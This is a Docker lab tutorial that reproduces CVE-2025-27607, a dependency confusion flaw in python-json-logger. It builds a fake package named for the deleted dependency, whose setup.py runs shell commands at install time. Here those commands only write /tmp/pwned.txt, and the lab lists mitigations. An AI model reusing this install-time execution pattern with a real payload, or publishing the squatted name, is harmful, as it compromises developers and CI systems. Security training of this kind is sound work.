
# 🧪 CVE-2025-27607 Lab: Simulating Python Supply Chain RCE via Dependency Confusion

## 📌 CVE Summary

**CVE-2025-27607** refers to a **remote code execution (RCE)** vulnerability in the popular Python logging formatter package: `python-json-logger`. Between **December 30, 2024** and **March 4, 2025**, the package's development dependencies included a now-deleted package:

```
msgspec-python313-pre
```

Because this package was **removed from PyPI**, the name was available for a third party to claim — a classic case of **dependency confusion**.

Here is a LinkedIn summary: [CVE-2025-27607](https://www.linkedin.com/posts/0x534c_cybersecurity-pythonloggingvulnerability-activity-7304483858475847680-7MlI/) - its a big deal!

If a malicious actor re-uploaded a fake version of this package, and a developer installed `python-json-logger[dev]` using pip on Python 3.13, the attacker could execute arbitrary code on the victim’s machine or CI/CD system.

- ✅ **Exploit vector**: Installing dev dependencies (`pip install python-json-logger[dev]`)
- ❗ **Impact**: Code execution at install-time via `setup.py`
- 🔧 **Fixed in**: `python-json-logger` version **3.3.0**

---

## 🧰 Building Labs from CVEs — Prompt Checklist

To create a lab from any CVE, you should gather the following:

### 1. 📄 Vulnerability Details
- CVE number and description
- Affected software and versions
- Type of vulnerability (e.g., RCE, buffer overflow, XSS)

### 2. 🎯 Learning Objectives
- What do students or analysts need to understand?
- What behavior are they trying to reproduce or analyze?

### 3. 🛠️ Environment Needs
- Docker, VMs, or host machine?
- Any specific language runtimes, package managers, etc.?

### 4. ⚙️ Exploit Method
- Will the lab show DoS, RCE, a data leak, etc.?
- Is it safe to simulate in a container?

### 5. 🔐 Remediation & Mitigation
- How was the bug patched?
- How can students secure the environment post-exploit?

---

## 🧪 Lab: Simulating CVE-2025-27607 in Docker

This lab demonstrates a **simulated RCE** via a hijacked development dependency in a controlled Docker environment.

### 🔧 What It Does

- Builds a **malicious Python package** that executes code on install.
- Creates a fake PyPI-style local directory.
- Installs the package via pip, simulating what happens if a developer installs untrusted dependencies.
- Confirms the payload was executed by creating a file: `/tmp/pwned.txt`.

---

## 🚀 Step-by-Step Tutorial

### 🗂️ Folder Structure

```
cve-2025-27607-lab/
├── docker-compose.yml
├── Dockerfile
├── install.sh
├── requirements.txt
└── malicious_pkg/
    └── setup.py
```

---

### 1️⃣ `malicious_pkg/setup.py`

```python
from setuptools import setup
import os

# Payload triggered at install time
os.system('echo "[+] RCE achieved! Writing to /tmp/pwned.txt"')
os.system('echo "Hacked by dependency confusion" > /tmp/pwned.txt')

setup(
    name='msgspec-python313-pre',
    version='0.1.0',
    description='Fake package to simulate supply chain attack',
    py_modules=[],
)
```

---

### 2️⃣ `requirements.txt`

```txt
msgspec-python313-pre
```

---

### 3️⃣ `install.sh`

```bash
#!/bin/bash
echo "[*] Installing dev dependencies..."

pip install --no-cache-dir --find-links=file:///local_pypi -r requirements.txt

echo "[*] Installation done."
ls /tmp/pwned.txt && cat /tmp/pwned.txt || echo "[!] Exploit file not found."
```

---

### 4️⃣ `Dockerfile`

```Dockerfile
FROM python:3.13-rc-slim

# Install build tools and setuptools
RUN apt-get update && apt-get install -y build-essential && \
    pip install --upgrade pip setuptools wheel

# Build malicious package
COPY malicious_pkg /malicious_pkg
WORKDIR /malicious_pkg
RUN python3 setup.py sdist && \
    mkdir -p /local_pypi && \
    cp dist/*.tar.gz /local_pypi/

# Copy and prep the app environment
WORKDIR /app
COPY requirements.txt install.sh /app/
RUN chmod +x install.sh

CMD ["./install.sh"]
```

---

### 5️⃣ `docker-compose.yml`

```yaml
version: "3.9"
services:
  rce-lab:
    build: .
    container_name: rce-lab
```

---

### ✅ Run the Lab

In your terminal, from the root of the lab folder:

```bash
docker-compose build
docker-compose up
```

---

### 🧾 Expected Output

```
[*] Installing dev dependencies...
[+] RCE achieved! Writing to /tmp/pwned.txt
[*] Installation done.
Hacked by dependency confusion
```

🎉 Success! You've just reproduced a **supply chain RCE vulnerability** using a hijacked dev dependency.

---

## ✅ Mitigation Strategies

- **Pin dependencies** using hashes or specific versions.
- Avoid installing dev/test dependencies in production.
- Use tools like:
  - [`pip-audit`](https://pypi.org/project/pip-audit/)
  - [`pip install --require-hashes`](https://pip.pypa.io/en/stable/cli/pip_install/#require-hashes)
- Monitor deleted packages in your dependency tree.

---

## 📚 Next Steps

- [ ] Add a detection exercise (can students find the backdoor?)
- [ ] Extend to simulate GitHub Actions CI compromise
- [ ] Build a hardened version with signed packages

---

## 🙏 Credits

This lab was developed as an educational demonstration of CVE-2025-27607 and is for **training purposes only**.

Always practice responsible disclosure and never publish malicious packages to public repositories.

---

```

Let me know if you want this zipped, pushed to a GitHub template, or if you'd like a student **worksheet** or **challenge questions** to go along with it!